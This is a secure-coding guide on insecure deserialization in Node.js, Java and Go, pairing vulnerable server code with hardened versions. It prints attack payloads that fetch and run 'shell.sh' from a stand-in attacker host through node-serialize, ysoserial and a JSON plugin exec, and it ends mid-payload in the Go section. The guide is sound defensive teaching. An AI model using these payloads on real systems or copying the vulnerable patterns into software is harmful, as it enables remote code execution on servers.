Using `node-serialize` or similar serialization libraries that can deserialize functions is extremely dangerous and can lead to Remote Code Execution (RCE). This vulnerability was exploited in real attacks leveraging CVE-2017-5941, allowing attackers to execute arbitrary code on servers.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const serialize = require('node-serialize');
const cookieParser = require('cookie-parser');

const app = express();
app.use(cookieParser());
app.use(express.json());

// DANGEROUS: Deserializes untrusted user input
app.get('/preferences', (req, res) => {
  const preferenceCookie = req.cookies.preferences;

  if (preferenceCookie) {
    // VULNERABLE: Deserializing user-controlled data
    const userPrefs = serialize.unserialize(preferenceCookie);
    res.json({ preferences: userPrefs });
  } else {
    res.json({ preferences: {} });
  }
});

app.post('/preferences', (req, res) => {
  const userPrefs = req.body;
  // Serialize and store in cookie
  const serialized = serialize.serialize(userPrefs);
  res.cookie('preferences', serialized);
  res.json({ status: 'saved' });
});

app.listen(3000);
```

**Attack Payload**:
```javascript
// Malicious serialized object with IIFE that executes on deserialize
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl https://attacker.com/shell.sh | bash')}()"}
```

**Why This Is Dangerous**:
- `node-serialize` can deserialize JavaScript functions, not just data
- The `_$$ND_FUNC$$_` prefix triggers function reconstruction
- Adding `()` at the end creates an IIFE that executes immediately during deserialization
- Attacker gains full RCE with the privileges of the Node.js process

**SECURE VERSION**:

```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const Ajv = require('ajv');

const app = express();
app.use(cookieParser());
app.use(express.json());

// Define strict schema for preferences
const ajv = new Ajv({ allErrors: true });
const preferencesSchema = {
  type: 'object',
  properties: {
    theme: { type: 'string', enum: ['light', 'dark', 'system'] },
    language: { type: 'string', pattern: '^[a-z]{2}(-[A-Z]{2})?$' },
    notifications: { type: 'boolean' },
    fontSize: { type: 'integer', minimum: 10, maximum: 24 }
  },
  additionalProperties: false,
  maxProperties: 10
};
const validatePreferences = ajv.compile(preferencesSchema);

// SECURE: Use JSON.parse with validation, not serialize
app.get('/preferences', (req, res) => {
  const preferenceCookie = req.cookies.preferences;

  if (preferenceCookie) {
    try {
      // Use JSON.parse - cannot deserialize functions
      const parsed = JSON.parse(preferenceCookie);

      // Validate against strict schema
      if (!validatePreferences(parsed)) {
        console.warn('Invalid preferences format:', validatePreferences.errors);
        return res.status(400).json({ error: 'Invalid preferences' });
      }

      res.json({ preferences: parsed });
    } catch (e) {
      console.error('Failed to parse preferences:', e.message);
      res.status(400).json({ error: 'Malformed preferences' });
    }
  } else {
    res.json({ preferences: {} });
  }
});

app.post('/preferences', (req, res) => {
  const userPrefs = req.body;

  // Validate input before storing
  if (!validatePreferences(userPrefs)) {
    return res.status(400).json({ error: 'Invalid preferences', details: validatePreferences.errors });
  }

  // Use JSON.stringify - safe serialization
  const serialized = JSON.stringify(userPrefs);
  res.cookie('preferences', serialized, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 30 * 24 * 60 * 60 * 1000 // 30 days
  });
  res.json({ status: 'saved' });
});

app.listen(3000);
```

**Key Security Controls**:
- **JSON.parse instead of unserialize**: JSON cannot contain executable code - it only supports primitive types, arrays, and plain objects
- **Schema validation with AJV**: Strictly defines allowed properties, types, and values - rejects unexpected data
- **Secure cookie attributes**: httpOnly prevents XSS access, secure ensures HTTPS, sameSite prevents CSRF

When handling complex data from external sources like APIs, webhooks, or message queues, you need a defense-in-depth approach with multiple validation layers. Never trust external data, even from supposedly trusted partners - the 2023 MOVEit breach demonstrated how trusted file transfer mechanisms can be weaponized.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const Ajv = require('ajv');
const addFormats = require('ajv-formats');
const crypto = require('crypto');
const winston = require('winston');
const rateLimit = require('express-rate-limit');

// Production-grade logger
const logger = winston.createLogger({
  level: process.env.LOG_LEVEL || 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.errors({ stack: true }),
    winston.format.json()
  ),
  defaultMeta: { service: 'data-processor' },
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'audit.log' })
  ]
});

// Schema validation setup
const ajv = new Ajv({ 
  allErrors: true,
  removeAdditional: true,  // Strip unexpected properties
  useDefaults: true,
  coerceTypes: false       // Prevent type coercion attacks
});
addFormats(ajv);

// Define allowed schemas for different message types
const schemas = {
  orderEvent: {
    type: 'object',
    required: ['eventId', 'timestamp', 'orderId', 'amount'],
    properties: {
      eventId: { type: 'string', format: 'uuid' },
      timestamp: { type: 'string', format: 'date-time' },
      orderId: { type: 'string', pattern: '^ORD-[A-Z0-9]{8}$' },
      amount: { type: 'number', minimum: 0, maximum: 1000000 },
      currency: { type: 'string', enum: ['USD', 'EUR', 'GBP'] },
      metadata: {
        type: 'object',
        properties: {
          source: { type: 'string', maxLength: 50 },
          version: { type: 'string', pattern: '^\\d+\\.\\d+\\.\\d+$' }
        },
        additionalProperties: false
      }
    },
    additionalProperties: false
  },
  userUpdate: {
    type: 'object',
    required: ['userId', 'action'],
    properties: {
      userId: { type: 'string', format: 'uuid' },
      action: { type: 'string', enum: ['update', 'deactivate'] },
      fields: {
        type: 'object',
        properties: {
          email: { type: 'string', format: 'email', maxLength: 255 },
          name: { type: 'string', maxLength: 100, pattern: '^[a-zA-Z\\s-]+$' }
        },
        additionalProperties: false
      }
    },
    additionalProperties: false
  }
};

// Compile schemas
const validators = {};
for (const [name, schema] of Object.entries(schemas)) {
  validators[name] = ajv.compile(schema);
}

// Secure deserialization service
class SecureDeserializer {
  constructor(options = {}) {
    this.maxPayloadSize = options.maxPayloadSize || 1024 * 1024; // 1MB
    this.allowedOrigins = new Set(options.allowedOrigins || []);
    this.hmacSecret = options.hmacSecret;
  }

  // Verify HMAC signature for trusted sources
  verifySignature(payload, signature, algorithm = 'sha256') {
    if (!this.hmacSecret) return false;

    const expectedSignature = crypto
      .createHmac(algorithm, this.hmacSecret)
      .update(payload)
      .digest('hex');

    // Timing-safe comparison to prevent timing attacks
    return crypto.timingSafeEqual(
      Buffer.from(signature, 'hex'),
      Buffer.from(expectedSignature, 'hex')
    );
  }

  // Main deserialization method with full validation
  deserialize(rawData, schemaName, options = {}) {
    const startTime = Date.now();
    const requestId = crypto.randomUUID();

    try {
      // Layer 1: Size validation
      if (Buffer.byteLength(rawData, 'utf8') > this.maxPayloadSize) {
        logger.warn('Payload size exceeded', { requestId, size: Buffer.byteLength(rawData) });
        throw new DeserializationError('PAYLOAD_TOO_LARGE', 'Payload exceeds maximum allowed size');
      }

      // Layer 2: Signature verification (if required)
      if (options.signature) {
        if (!this.verifySignature(rawData, options.signature)) {
          logger.error('Signature verification failed', { requestId, origin: options.origin });
          throw new DeserializationError('INVALID_SIGNATURE', 'Message signature verification failed');
        }
      }

      // Layer 3: Safe JSON parsing with reviver for sanitization
      let parsed;
      try {
        parsed = JSON.parse(rawData, (key, value) => {
          // Reject any attempt to include functions or prototypes
          if (typeof value === 'string') {
            if (value.includes('_$$ND_FUNC$$_') || 
                value.includes('__proto__') ||
                value.includes('constructor')) {
              logger.error('Potential injection attempt detected', { requestId, key });
              throw new DeserializationError('INJECTION_DETECTED', 'Malicious content detected');
            }
          }
          return value;
        });
      } catch (e) {
        if (e instanceof DeserializationError) throw e;
        logger.warn('JSON parse failed', { requestId, error: e.message });
        throw new DeserializationError('PARSE_ERROR', 'Invalid JSON format');
      }

      // Layer 4: Prototype pollution prevention
      if (parsed && typeof parsed === 'object') {
        this.sanitizeObject(parsed);
      }

      // Layer 5: Schema validation
      const validator = validators[schemaName];
      if (!validator) {
        throw new DeserializationError('UNKNOWN_SCHEMA', `Unknown schema: ${schemaName}`);
      }

      if (!validator(parsed)) {
        logger.warn('Schema validation failed', { 
          requestId, 
          schema: schemaName, 
          errors: validator.errors 
        });
        throw new DeserializationError('VALIDATION_FAILED', 'Data does not match expected schema', validator.errors);
      }

      // Success - audit log
      logger.info('Deserialization successful', {
        requestId,
        schema: schemaName,
        duration: Date.now() - startTime,
        origin: options.origin
      });

      return { success: true, data: parsed, requestId };

    } catch (error) {
      if (error instanceof DeserializationError) {
        return { success: false, error: error.code, message: error.message, requestId };
      }
      logger.error('Unexpected deserialization error', { requestId, error: error.message });
      return { success: false, error: 'INTERNAL_ERROR', message: 'Processing failed', requestId };
    }
  }

  // Deep sanitization to prevent prototype pollution
  sanitizeObject(obj, depth = 0) {
    if (depth > 10) throw new DeserializationError('DEPTH_EXCEEDED', 'Object nesting too deep');

    const dangerousKeys = ['__proto__', 'constructor', 'prototype'];

    for (const key of Object.keys(obj)) {
      if (dangerousKeys.includes(key)) {
        delete obj[key];
        continue;
      }

      if (obj[key] && typeof obj[key] === 'object') {
        this.sanitizeObject(obj[key], depth + 1);
      }
    }
  }
}

class DeserializationError extends Error {
  constructor(code, message, details = null) {
    super(message);
    this.code = code;
    this.details = details;
  }
}

// Express app with rate limiting
const app = express();
app.use(express.text({ limit: '1mb', type: '*/*' }));

const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false
});
app.use('/api/', limiter);

// Initialize deserializer with production config
const deserializer = new SecureDeserializer({
  maxPayloadSize: 512 * 1024,
  hmacSecret: process.env.WEBHOOK_SECRET,
  allowedOrigins: ['partner-api.example.com', 'queue.internal.net']
});

// Webhook endpoint with full security
app.post('/api/webhooks/orders', (req, res) => {
  const signature = req.headers['x-webhook-signature'];
  const origin = req.headers['x-origin'] || 'unknown';

  const result = deserializer.deserialize(req.body, 'orderEvent', {
    signature,
    origin
  });

  if (!result.success) {
    return res.status(400).json({
      error: result.error,
      message: result.message,
      requestId: result.requestId
    });
  }

  // Process validated data safely
  processOrder(result.data);
  res.json({ status: 'accepted', requestId: result.requestId });
});

app.listen(3000);
```

**Defense in Depth Layers**:

1. **Size Limits**: Prevent DoS via oversized payloads
```javascript
if (Buffer.byteLength(rawData, 'utf8') > this.maxPayloadSize) {
  throw new DeserializationError('PAYLOAD_TOO_LARGE');
}
```

2. **Cryptographic Signature Verification**: Ensure data integrity from trusted sources
```javascript
const expectedSignature = crypto
  .createHmac('sha256', this.hmacSecret)
  .update(payload)
  .digest('hex');
return crypto.timingSafeEqual(sig1, sig2);  // Timing-safe!
```

3. **JSON Reviver Sanitization**: Block injection patterns during parsing
```javascript
JSON.parse(rawData, (key, value) => {
  if (value.includes('_$$ND_FUNC$$_')) {
    throw new DeserializationError('INJECTION_DETECTED');
  }
  return value;
});
```

**Additional Protections**:
- **Rate limiting**: Prevents abuse of deserialization endpoints
- **Comprehensive audit logging**: Track all deserialization attempts with request IDs for forensics
- **Depth limiting**: Prevents stack overflow via deeply nested objects
- **Prototype pollution guards**: Explicitly removes dangerous keys like `__proto__`
- **Strict schema enforcement with removeAdditional**: Unknown properties are stripped, not just rejected
- **Timing-safe comparison**: Prevents timing attacks on signature verification

**Never deserialize untrusted data with Java's native ObjectInputStream** - this is one of the most dangerous vulnerabilities in Java applications, enabling Remote Code Execution (RCE). The Log4Shell vulnerability (CVE-2021-44228) exploited similar deserialization issues and affected over 40% of corporate networks worldwide.

**VULNERABLE CODE**:

```java
import java.io.*;
import java.util.Base64;
import javax.servlet.http.*;

public class UserPreferencesServlet extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        Cookie[] cookies = request.getCookies();
        UserPreferences prefs = null;

        if (cookies != null) {
            for (Cookie cookie : cookies) {
                if ("userPrefs".equals(cookie.getName())) {
                    // VULNERABLE: Deserializing untrusted user input
                    byte[] data = Base64.getDecoder().decode(cookie.getValue());
                    ObjectInputStream ois = new ObjectInputStream(
                        new ByteArrayInputStream(data)
                    );
                    prefs = (UserPreferences) ois.readObject(); // RCE HERE!
                    ois.close();
                    break;
                }
            }
        }

        if (prefs == null) {
            prefs = new UserPreferences();
        }

        response.getWriter().write("Theme: " + prefs.getTheme());
    }
}
```

**Attack Payload** (using ysoserial to generate malicious serialized object):
```bash
# Generate payload that executes 'curl attacker.com/shell.sh | bash'
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/shell.sh | bash' | base64 -w0

# Result is placed in cookie:
# Cookie: userPrefs=rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpE...
```

**Why This Is Dangerous**:
- Java's `ObjectInputStream.readObject()` executes code during deserialization via gadget chains
- Attackers use libraries like ysoserial to craft payloads that execute arbitrary commands
- The cast to `UserPreferences` happens AFTER the malicious code executes - too late
- No validation can prevent exploitation once `readObject()` is called on malicious data

**SECURE VERSION**:

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.DeserializationFeature;
import javax.servlet.http.*;
import java.io.IOException;
import java.util.Base64;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class SecureUserPreferencesServlet extends HttpServlet {
    private static final Logger logger = LoggerFactory.getLogger(
        SecureUserPreferencesServlet.class
    );

    // Use JSON instead of Java serialization
    private static final ObjectMapper mapper = new ObjectMapper()
        .disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES)
        .disable(DeserializationFeature.ACCEPT_FLOAT_AS_INT);

    private static final int MAX_PREFS_SIZE = 4096; // Limit payload size

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        Cookie[] cookies = request.getCookies();
        UserPreferences prefs = getDefaultPreferences();

        if (cookies != null) {
            for (Cookie cookie : cookies) {
                if ("userPrefs".equals(cookie.getName())) {
                    try {
                        String cookieValue = cookie.getValue();

                        // DEFENSE 1: Size limit to prevent DoS
                        if (cookieValue.length() > MAX_PREFS_SIZE) {
                            logger.warn("Oversized preference cookie from IP: {}", 
                                request.getRemoteAddr());
                            break;
                        }

                        // DEFENSE 2: Use JSON, not Java serialization
                        byte[] data = Base64.getDecoder().decode(cookieValue);
                        String json = new String(data, java.nio.charset.StandardCharsets.UTF_8);

                        // DEFENSE 3: Deserialize to specific, simple class
                        prefs = mapper.readValue(json, UserPreferences.class);

                        // DEFENSE 4: Validate deserialized values
                        prefs = validateAndSanitize(prefs);

                    } catch (Exception e) {
                        logger.warn("Invalid preference cookie: {}", e.getMessage());
                        prefs = getDefaultPreferences();
                    }
                    break;
                }
            }
        }

        response.setContentType("text/plain");
        response.getWriter().write("Theme: " + prefs.getTheme());
    }

    private UserPreferences validateAndSanitize(UserPreferences prefs) {
        UserPreferences safe = new UserPreferences();

        // Whitelist allowed values
        String theme = prefs.getTheme();
        if (theme != null && ALLOWED_THEMES.contains(theme.toLowerCase())) {
            safe.setTheme(theme);
        }

        return safe;
    }

    private static final java.util.Set<String> ALLOWED_THEMES = 
        java.util.Set.of("light", "dark", "system");

    private UserPreferences getDefaultPreferences() {
        UserPreferences prefs = new UserPreferences();
        prefs.setTheme("system");
        return prefs;
    }
}
```

**Key Security Controls**:
- **JSON instead of Java serialization**: Jackson's JSON parser cannot execute arbitrary code through gadget chains
- **Size limits**: Prevents denial-of-service through oversized payloads
- **Whitelist validation**: Only accepts known-good values after deserialization
- **Specific target class**: Deserializes only to simple POJOs, not polymorphic types

If you're forced to use Java serialization for legacy compatibility, you must implement multiple defense layers. Even then, **migrate away as soon as possible** - no filtering approach is 100% safe against deserialization attacks.

**PRODUCTION PATTERN**:

```java
import java.io.*;
import java.util.*;
import javax.servlet.http.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class SecureDeserializationService {
    private static final Logger logger = LoggerFactory.getLogger(
        SecureDeserializationService.class
    );
    private static final Logger auditLog = LoggerFactory.getLogger("AUDIT");

    // DEFENSE 1: Strict whitelist of allowed classes
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.myapp.model.UserPreferences",
        "com.myapp.model.UserSettings",
        "java.lang.String",
        "java.lang.Integer",
        "java.lang.Long",
        "java.lang.Boolean",
        "java.util.ArrayList",
        "java.util.HashMap"
    );

    // DEFENSE 2: Block known dangerous classes (defense in depth)
    private static final Set<String> BLOCKED_PACKAGES = Set.of(
        "org.apache.commons.collections",
        "org.apache.commons.beanutils",
        "org.springframework.beans",
        "com.sun.org.apache.xalan",
        "javax.management",
        "java.rmi",
        "sun.rmi",
        "com.mchange",
        "org.codehaus.groovy.runtime",
        "org.mozilla.javascript",
        "com.sun.rowset",
        "java.lang.Runtime",
        "java.lang.ProcessBuilder"
    );

    private static final int MAX_SERIALIZED_SIZE = 10240; // 10KB max
    private static final int MAX_DEPTH = 10; // Prevent nested object bombs

    /**
     * Secure ObjectInputStream with class filtering
     */
    private static class SecureObjectInputStream extends ObjectInputStream {
        private int depth = 0;
        private final String requestId;
        private final String clientIp;

        public SecureObjectInputStream(InputStream in, String requestId, String clientIp) 
                throws IOException {
            super(in);
            this.requestId = requestId;
            this.clientIp = clientIp;
        }

        @Override
        protected Class<?> resolveClass(ObjectStreamClass desc) 
                throws IOException, ClassNotFoundException {

            String className = desc.getName();
            depth++;

            // DEFENSE 3: Depth limit to prevent object graph attacks
            if (depth > MAX_DEPTH) {
                auditLog.error("SECURITY: Object depth exceeded. requestId={}, ip={}, class={}",
                    requestId, clientIp, className);
                throw new SecurityException("Maximum object depth exceeded");
            }

            // DEFENSE 4: Block dangerous packages first
            for (String blocked : BLOCKED_PACKAGES) {
                if (className.startsWith(blocked)) {
                    auditLog.error("SECURITY: Blocked class in deserialization. " +
                        "requestId={}, ip={}, class={}", requestId, clientIp, className);
                    throw new SecurityException("Deserialization of class blocked: " + className);
                }
            }

            // DEFENSE 5: Whitelist validation (primary defense)
            if (!ALLOWED_CLASSES.contains(className) && !className.startsWith("[")) {
                // Allow array types of whitelisted classes
                String arrayType = className.replaceAll("^\\[+L|;$", "");
                if (!ALLOWED_CLASSES.contains(arrayType)) {
                    auditLog.error("SECURITY: Non-whitelisted class. requestId={}, ip={}, class={}",
                        requestId, clientIp, className);
                    throw new SecurityException("Deserialization of class not allowed: " + className);
                }
            }

            logger.debug("Deserializing allowed class: {}", className);
            return super.resolveClass(desc);
        }
    }

    /**
     * Safely deserialize with all protections enabled
     */
    public <T> T deserialize(byte[] data, Class<T> expectedType, 
            HttpServletRequest request) throws SecurityException {

        String requestId = UUID.randomUUID().toString();
        String clientIp = getClientIp(request);

        // DEFENSE 6: Size limit
        if (data == null || data.length == 0) {
            throw new SecurityException("Empty serialized data");
        }

        if (data.length > MAX_SERIALIZED_SIZE) {
            auditLog.warn("SECURITY: Oversized payload rejected. requestId={}, ip={}, size={}",
                requestId, clientIp, data.length);
            throw new SecurityException("Serialized data exceeds maximum size");
        }

        // DEFENSE 7: Magic bytes validation (Java serialization starts with 0xACED)
        if (data.length < 4 || data[0] != (byte)0xAC || data[1] != (byte)0xED) {
            auditLog.warn("SECURITY: Invalid serialization format. requestId={}, ip={}",
                requestId, clientIp);
            throw new SecurityException("Invalid serialization format");
        }

        try (SecureObjectInputStream ois = new SecureObjectInputStream(
                new ByteArrayInputStream(data), requestId, clientIp)) {

            Object obj = ois.readObject();

            // DEFENSE 8: Type verification after deserialization
            if (!expectedType.isInstance(obj)) {
                auditLog.error("SECURITY: Type mismatch. requestId={}, expected={}, actual={}",
                    requestId, expectedType.getName(), obj.getClass().getName());
                throw new SecurityException("Deserialized object type mismatch");
            }

            auditLog.info("Successful deserialization. requestId={}, ip={}, type={}",
                requestId, clientIp, expectedType.getName());

            return expectedType.cast(obj);

        } catch (SecurityException e) {
            throw e; // Re-throw security exceptions
        } catch (Exception e) {
            auditLog.error("SECURITY: Deserialization failed. requestId={}, ip={}, error={}",
                requestId, clientIp, e.getMessage());
            throw new SecurityException("Deserialization failed: " + e.getMessage(), e);
        }
    }

    private String getClientIp(HttpServletRequest request) {
        String xff = request.getHeader("X-Forwarded-For");
        if (xff != null && !xff.isEmpty()) {
            return xff.split(",")[0].trim();
        }
        return request.getRemoteAddr();
    }
}
```

**Defense in Depth Layers**:

1. **Java Agent-based protection (JVM level)**:
```java
// Add to JVM startup: -javaagent:serialkiller.jar
// Or use Java 9+ deserialization filter:
// -Djdk.serialFilter=com.myapp.model.*;java.lang.*;!*
```

2. **Network-level protection with WAF rules**:
```text
# ModSecurity rule to detect Java serialization magic bytes
SecRule REQUEST_BODY "@rx \xac\xed\x00\x05" "id:1001,phase:2,deny,status:403,msg:'Java serialization detected'"
```

3. **Monitoring and alerting**:
```java
// Prometheus metrics for security events
public class DeserializationMetrics {
    private static final Counter blockedAttempts = Counter.build()
        .name("deserialization_blocked_total")
        .help("Number of blocked deserialization attempts")
        .labelNames("reason", "class_name")
        .register();

    private static final Counter successfulDeserializations = Counter.build()
        .name("deserialization_success_total")
        .help("Number of successful deserializations")
        .labelNames("class_name")
        .register();

    public static void recordBlocked(String reason, String className) {
        blockedAttempts.labels(reason, className).inc();
        // Trigger alert if threshold exceeded
        if (blockedAttempts.labels(reason, className).get() > 10) {
            AlertManager.sendAlert("High deserialization attack rate detected");
        }
    }
}
```

**Additional Protections**:
- **Use Java 9+ ObjectInputFilter**: Built-in JDK filtering is more reliable than custom solutions
- **Remove vulnerable libraries**: Audit dependencies for gadget chain sources (Commons Collections < 4.1, Spring Framework < 4.2.6)
- **Runtime Application Self-Protection (RASP)**: Tools like Contrast Security can block attacks at runtime
- **Signature verification**: If data comes from your own systems, sign serialized data with HMAC and verify before deserializing

```java
// Signature verification example
public byte[] signData(byte[] data, SecretKey key) throws Exception {
    Mac mac = Mac.getInstance("HmacSHA256");
    mac.init(key);
    byte[] signature = mac.doFinal(data);

    ByteArrayOutputStream out = new ByteArrayOutputStream();
    out.write(signature);
    out.write(data);
    return out.toByteArray();
}

public byte[] verifyAndExtract(byte[] signedData, SecretKey key) throws SecurityException {
    if (signedData.length < 32) {
        throw new SecurityException("Invalid signed data");
    }

    byte[] signature = Arrays.copyOfRange(signedData, 0, 32);
    byte[] data = Arrays.copyOfRange(signedData, 32, signedData.length);

    Mac mac = Mac.getInstance("HmacSHA256");
    mac.init(key);
    byte[] expectedSig = mac.doFinal(data);

    if (!MessageDigest.isEqual(signature, expectedSig)) {
        auditLog.error("SECURITY: Invalid signature on serialized data");
        throw new SecurityException("Signature verification failed");
    }

    return data;
}
```

**Migration Path**: Plan migration to safer alternatives:
- JSON (Jackson with type handling disabled)
- Protocol Buffers
- Apache Avro
- XML with strict schema validation

Deserializing data from untrusted sources is a critical security concern. While Go's standard JSON library is safer than some languages, there are still significant risks when handling external data, especially with interfaces and reflection.

**VULNERABLE CODE**:

```go
package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
)

// Plugin represents a dynamically loaded component
type Plugin struct {
	Name    string `json:"name"`
	Command string `json:"command"`
	Args    []string `json:"args"`
}

// PluginConfig holds multiple plugins
type PluginConfig struct {
	Plugins []Plugin `json:"plugins"`
}

func loadPlugins(w http.ResponseWriter, r *http.Request) {
	body, _ := ioutil.ReadAll(r.Body)

	var config PluginConfig
	// VULNERABLE: Deserializing untrusted input directly
	json.Unmarshal(body, &config)

	for _, plugin := range config.Plugins {
		// CRITICAL VULNERABILITY: Executing commands from deserialized data
		cmd := exec.Command(plugin.Command, plugin.Args...)
		output, _ := cmd.CombinedOutput()
		fmt.Fprintf(w, "Plugin %s output: %s\n", plugin.Name, output)
	}
}

func main() {
	http.HandleFunc("/load-plugins", loadPlugins)
	http.ListenAndServe(":8080", nil)
}
```

**Attack Payload**:
```json
{
  "plugins": [
    {
      "name": "malicious",
      "command": "/bin/bash",
      "args": ["-c", "curl https://attacker.com/shell.sh | bash"]
    }
